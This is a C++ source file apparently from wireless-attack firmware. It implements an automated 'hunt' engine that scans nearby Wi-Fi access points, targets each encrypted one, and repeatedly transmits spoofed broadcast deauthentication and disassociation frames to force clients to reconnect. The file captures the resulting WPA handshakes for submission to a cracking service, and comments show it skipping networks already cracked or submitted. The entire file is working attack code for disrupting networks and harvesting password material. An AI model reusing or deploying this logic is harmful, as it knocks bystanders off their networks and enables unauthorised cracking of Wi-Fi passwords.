/**
 * @file hunt_engine.cpp
 * @brief Implementation of the endless-AutoHunt state machine (ADR-0015).
 */
#include "net/hunt_engine.h"

#include <cstring>  // memcpy: copy the target identity into the pull snapshot.

#include "core/deadline.h"       // reached(): the wrap-safe deadline test shared across clock-driven units.
#include "net/cracked_lookup.h"    // CrackedLookup::isCracked — the gate-B target filter (ADR-0061 #28).
#include "net/submitted_lookup.h"  // SubmittedLookup::isSubmitted — the gate-C target filter (ADR-0065 #30).

namespace sapper {
namespace {

/// The collector needs a target at construction; the engine retargets it before the first capture, so
/// this all-zero placeholder is never actually hunted.
constexpr uint8_t kNoTarget[6] = {0, 0, 0, 0, 0, 0};

}  // namespace

HuntEngine::HuntEngine(RadioSniffer& sniffer, ApRegistry& registry, CaptureReadyObserver& observer,
                       const uint8_t* channels, size_t channelCount, const HuntConfig& config,
                       RawTransmitter* transmitter)
    : sniffer_(sniffer),
      registry_(registry),
      observer_(observer),
      transmitter_(transmitter),
      collector_(kNoTarget, 0),
      handshakeConsumer_(collector_),
      hopper_(channels, channelCount, config.dwellMs),
      config_(config) {}

bool HuntEngine::retuneTo(uint8_t channel) {
    if (!sniffer_.setChannel(channel)) return false;  // radio rejected it (e.g. country-restricted).
    parkedChannel_ = channel;
    registry_.setCurrentChannel(channel);  // fallback tracks only a confirmed retune (ADR-0013 #3).
    return true;
}

bool HuntEngine::begin(uint32_t nowMs) {
    hopper_.reset(nowMs);
    const uint8_t channel = hopper_.currentChannel();
    // Aim the router before begin(): the moment the sniffer installs us, onFrame may fire.
    activeSink_.store(&registry_, std::memory_order_release);
    if (!sniffer_.begin(channel, *this)) {
        activeSink_.store(nullptr, std::memory_order_release);
        phase_ = Phase::Idle;
        return false;
    }
    parkedChannel_ = channel;
    registry_.setCurrentChannel(channel);
    phase_ = Phase::Discovering;
    phaseDeadlineMs_ = nowMs + config_.discoverWindowMs;
    return true;
}

void HuntEngine::enterQuiesce(uint32_t nowMs, Resume resume) {
    // Aim the router away so no sink is written across the settle, then wait it out (ADR-0015 #4).
    activeSink_.store(nullptr, std::memory_order_release);
    resume_ = resume;
    quiesceUntilMs_ = nowMs + config_.settleMs;
    phase_ = Phase::Quiescing;
}

void HuntEngine::doEnterDiscovering(uint32_t nowMs) {
    // Reached only with the router aimed away (from a quiesce), so resetting the registry is safe.
    registry_.reset();
    hopper_.reset(nowMs);
    retuneTo(hopper_.currentChannel());  // a rejected first channel leaves the last parked one.
    activeSink_.store(&registry_, std::memory_order_release);
    phase_ = Phase::Discovering;
    phaseDeadlineMs_ = nowMs + config_.discoverWindowMs;
}

void HuntEngine::doStartCapturing(uint32_t nowMs) {
    // Reached only with the router aimed away (from a quiesce), so retargeting the collector is safe.
    // RSSI floor (ADR-0068 #31): two passes over the enumeration in discovery order. Pass 1
    // (belowFloorPass_ == false) attempts only APs at or above kRssiFloor; when it exhausts, we flip to
    // pass 2 and re-walk from the top attempting only the below-floor tail. Deprioritise, never skip — the
    // weak partition is still attempted when nothing stronger remains, so no targetable handshake is
    // forfeited (ADR-0068 decision 4). Discovery order is preserved within each partition — no RSSI sort
    // (decision 5): the field run's strongest band was client-less, so sorting strongest-first would
    // attack dead airtime; a binary floor treats every in-partition AP equally.
    for (;;) {
        while (targetIndex_ < targetCount_) {
            const DiscoveredAp& target = registry_.at(targetIndex_);
            // Not this pass's partition — skip now, attempt on the other pass (the floor's whole point).
            if ((target.rssi < kRssiFloor) != belowFloorPass_) {
                ++targetIndex_;
                continue;
            }
            // Skip an open network (ADR-0063 #29): an unencrypted BSS has no WPA 4-way handshake to
            // capture, so tuning to it only wastes a capture window (and deauth airtime). Always on — an
            // intrinsic beacon property, not the opt-in external state gate B consults below.
            if (target.isOpen) {
                ++targetIndex_;
                continue;
            }
            // Gate B (ADR-0061 #28): a BSSID wpa-sec already cracked is skipped like a channel-rejected
            // one — never tuned to, captured, or (never being capturingBssid()) deauthed. Off by default.
            if (crackedLookup_ != nullptr && crackedLookup_->isCracked(target.bssid)) {
                ++targetIndex_;
                continue;
            }
            // Gate C (ADR-0065 #30): a BSSID we have already landed a valid handshake for at wpa-sec is
            // skipped too — the general form of gate B (submitted ⊇ cracked), so we stop spending capture
            // windows and deauth on it while it waits to be cracked, not just after. Complements gate B
            // (the cracked floor stays authoritative even if this local set is lost); off by default.
            if (submittedLookup_ != nullptr && submittedLookup_->isSubmitted(target.bssid)) {
                ++targetIndex_;
                continue;
            }
            // Never-captured-AP backoff (ADR-0070 #32): an AP that yielded no handshake in
            // kBackoffMissThreshold consecutive windows is skipped for a cadence — reclaiming the windows a
            // strong client-less/PMF AP spends every cycle, which the RSSI floor cannot (#31: such an AP is
            // in the first-attempted partition). Deprioritise for a cadence, never permanently skip: the
            // suppression lifts after kBackoffCadenceCycles cycles, then the AP is retried.
            if (isBackedOff(target.bssid)) {
                ++targetIndex_;
                continue;
            }
            if (retuneTo(target.channel)) {
                collector_.retarget(target.bssid, target.channel);
                activeSink_.store(&handshakeConsumer_, std::memory_order_release);
                phase_ = Phase::Capturing;
                phaseDeadlineMs_ = nowMs + config_.captureWindowMs;
                deauthDueMs_ = nowMs;  // armed: fire the first deauth burst on the first Capturing tick.
                return;
            }
            ++targetIndex_;  // radio rejected this target's channel — skip it, never capture off-channel.
        }
        // This partition is exhausted. On the strong pass, drop to the below-floor one and re-walk from the
        // top; on the weak pass, the whole enumeration is spent — sweep afresh (ADR-0068 #31).
        if (!belowFloorPass_) {
            belowFloorPass_ = true;
            targetIndex_ = 0;
            continue;
        }
        break;
    }
    doEnterDiscovering(nowMs);  // no capturable target remained in either partition; sweep afresh.
}

void HuntEngine::advanceTarget(uint32_t nowMs) {
    // Always re-enter doStartCapturing: it owns partition exhaustion (flip to the below-floor pass, or
    // re-discover when both are spent — ADR-0068 #31). Short-circuiting to doEnterDiscovering here, as this
    // did before the floor, would skip the weak partition whenever the last strong target was the one just
    // captured — forfeiting handshakes the "deprioritise, never skip" rule promises to still attempt.
    ++targetIndex_;
    doStartCapturing(nowMs);
}

int HuntEngine::indexOfBackoff(const uint8_t* bssid) const {
    for (size_t i = 0; i < backoffCount_; ++i) {
        if (std::memcmp(backoff_[i].bssid, bssid, 6) == 0) return static_cast<int>(i);
    }
    return -1;
}

bool HuntEngine::isBackedOff(const uint8_t* bssid) const {
    const int idx = indexOfBackoff(bssid);
    return idx >= 0 && backoff_[idx].backoffUntilCycle > cycleCounter_;
}

int HuntEngine::insertBackoff(const uint8_t* bssid) {
    size_t slot;
    if (backoffCount_ < kMaxBackoffEntries) {
        slot = backoffCount_++;
    } else {
        // Table full: evict the least-penalised entry — the smallest suppression horizon, so a
        // capture-cleared (horizon 0) or already-expired slot goes before an actively-backed-off one.
        slot = 0;
        for (size_t i = 1; i < backoffCount_; ++i) {
            if (backoff_[i].backoffUntilCycle < backoff_[slot].backoffUntilCycle) slot = i;
        }
    }
    BackoffEntry& entry = backoff_[slot];
    std::memcpy(entry.bssid, bssid, 6);
    entry.consecutiveMisses = 0;
    entry.backoffUntilCycle = 0;
    return static_cast<int>(slot);
}

void HuntEngine::registerCaptureOutcome(const uint8_t* bssid, bool captured) {
    int idx = indexOfBackoff(bssid);
    if (captured) {
        // A productive AP: clear its history so it is treated as fully productive from here (ADR-0070 #2).
        // The now-inert slot (horizon 0) stays — it is the first the eviction scan reclaims.
        if (idx >= 0) {
            backoff_[idx].consecutiveMisses = 0;
            backoff_[idx].backoffUntilCycle = 0;
        }
        return;
    }
    // An empty capture window. Track the AP (inserting, evicting the least-penalised slot if full), count
    // the miss, and at the threshold suppress it for the cadence. The count resets only on a capture, so a
    // still-empty retry after the cadence immediately re-crosses the threshold — one window per cadence.
    if (idx < 0) idx = insertBackoff(bssid);
    BackoffEntry& entry = backoff_[static_cast<size_t>(idx)];
    if (entry.consecutiveMisses < UINT16_MAX) ++entry.consecutiveMisses;
    if (entry.consecutiveMisses >= kBackoffMissThreshold) {
        entry.backoffUntilCycle = cycleCounter_ + kBackoffCadenceCycles;
    }
}

void HuntEngine::tick(uint32_t nowMs) {
    switch (phase_) {
        case Phase::Idle:
            return;

        case Phase::Discovering: {
            if (hopper_.tick(nowMs)) retuneTo(hopper_.currentChannel());
            if (reached(nowMs, phaseDeadlineMs_)) {
                targetCount_ = registry_.count();  // snapshot; the table is append-only past here.
                targetIndex_ = 0;
                belowFloorPass_ = false;  // a new enumeration starts on the strong partition (ADR-0068 #31).
                ++cycleCounter_;  // a new enumeration cycle: advances every AP's backoff horizon (ADR-0070 #32).
                // Every phase change clears a sink, so it goes through one settle (ADR-0015 #4).
                enterQuiesce(nowMs, targetCount_ == 0 ? Resume::Discovering : Resume::CaptureFromIndex);
            }
            return;
        }

        case Phase::Capturing: {
            if (collector_.isWpaSecValid()) {
                enterQuiesce(nowMs, Resume::ReportThenAdvance);  // captured: stop deauthing, report.
            } else if (reached(nowMs, phaseDeadlineMs_)) {
                enterQuiesce(nowMs, Resume::AdvanceNoReport);
            } else {
                maybeTransmitDeauth(nowMs);  // still capturing this target: force reassociation (armed).
            }
            return;
        }

        case Phase::Quiescing: {
            if (!reached(nowMs, quiesceUntilMs_)) return;  // settle not yet elapsed.
            switch (resume_) {
                case Resume::Discovering:
                    doEnterDiscovering(nowMs);
                    return;
                case Resume::CaptureFromIndex:
                    doStartCapturing(nowMs);
                    return;
                case Resume::ReportThenAdvance:
                    // Safe read: the router is aimed away and settled, so no onFrame is mid-ingest.
                    observer_.onCaptureReady(collector_.handshake());
                    registerCaptureOutcome(collector_.handshake().bssid, /*captured=*/true);  // rehabilitate (ADR-0070 #32).
                    advanceTarget(nowMs);
                    return;
                case Resume::AdvanceNoReport:
                    registerCaptureOutcome(collector_.handshake().bssid, /*captured=*/false);  // an empty window (ADR-0070 #32).
                    advanceTarget(nowMs);
                    return;
            }
            return;
        }
    }
}

void HuntEngine::stop() {
    activeSink_.store(nullptr, std::memory_order_release);
    sniffer_.stop();
    phase_ = Phase::Idle;
}

void HuntEngine::onFrame(const uint8_t* frame, uint16_t len, int8_t rssi) {
    FrameConsumer* sink = activeSink_.load(std::memory_order_acquire);
    if (sink != nullptr) sink->onFrame(frame, len, rssi);
}

const uint8_t* HuntEngine::capturingBssid() const {
    if (phase_ != Phase::Capturing) return nullptr;
    return collector_.handshake().bssid;
}

HuntSnapshot HuntEngine::huntSnapshot() const {
    // Cosmetic, lock-free by design (ADR-0033 #3, §4 #18): the collector is written on the driver task
    // (onFrame → ingest, §4 #10) while this runs on the app task. DO NOT add a lock — it would put
    // contention on the driver-task hot path for a HUD read whose staleness is harmless. Why each field
    // read here is safe without one: `bssid` is written once, at retarget, on the app task under the §4
    // #11 quiesce settle — no driver-task write races it. The presence flags are backed by a small
    // length field written monotonically (0 → set once per frame, never reset until retarget), so a torn
    // read is at worst a one-tick-early/late indicator. `ssid` is re-written by every beacon for the
    // current target *on the driver task*, but the collector publishes it in a single memcpy of a
    // complete value (handshake_collector.cpp), so a concurrent read sees a consistent name, never a
    // transient empty one. Any residual staleness is one tick, gone the next.
    HuntSnapshot snap;
    snap.phase = phase_;
    snap.channel = parkedChannel_;
    snap.discovered = registry_.count();
    if (phase_ == Phase::Capturing) {
        const CapturedHandshake& hs = collector_.handshake();
        std::memcpy(snap.bssid, hs.bssid, sizeof(snap.bssid));
        std::memcpy(snap.ssid, hs.ssid, sizeof(snap.ssid));
        snap.ssid[sizeof(snap.ssid) - 1] = '\0';  // defend against a torn/over-long read of the array.
        snap.hasBeacon = hs.hasBeacon();
        snap.hasM1 = hs.has(HandshakeMessage::M1);
        snap.hasM2 = hs.has(HandshakeMessage::M2);
        snap.hasM3 = hs.has(HandshakeMessage::M3);
        snap.hasM4 = hs.has(HandshakeMessage::M4);
    }
    return snap;
}

void HuntEngine::maybeTransmitDeauth(uint32_t nowMs) {
    if (transmitter_ == nullptr) return;            // disarmed: passive hunt, transmit nothing (#16).
    if (!reached(nowMs, deauthDueMs_)) return;      // within the cadence gap — let the client reassociate.
    // Reached only from the Capturing branch, so the collector's target IS the parked AP: source and
    // BSSID = capturingBssid(), destination = broadcast (every client of that AP at once, no scanner).
    const uint8_t* bssid = collector_.handshake().bssid;
    transmitDeauthFrame(ManagementSubtype::Deauth, bssid);
    transmitDeauthFrame(ManagementSubtype::Disassoc, bssid);
    deauthDueMs_ = nowMs + config_.deauthIntervalMs;
}

void HuntEngine::transmitDeauthFrame(ManagementSubtype subtype, const uint8_t bssid[6]) {
    uint8_t frame[kDeauthFrameLen];
    const size_t len = buildDeauthFrame(frame, sizeof(frame), subtype, kBroadcastMac, bssid,
                                        DeauthReason::Class3FrameFromNonassoc);
    if (transmitter_->transmit(frame, static_cast<uint16_t>(len))) {
        ++deauthTxOk_;
    } else {
        ++deauthTxFail_;
    }
}

}  // namespace sapper
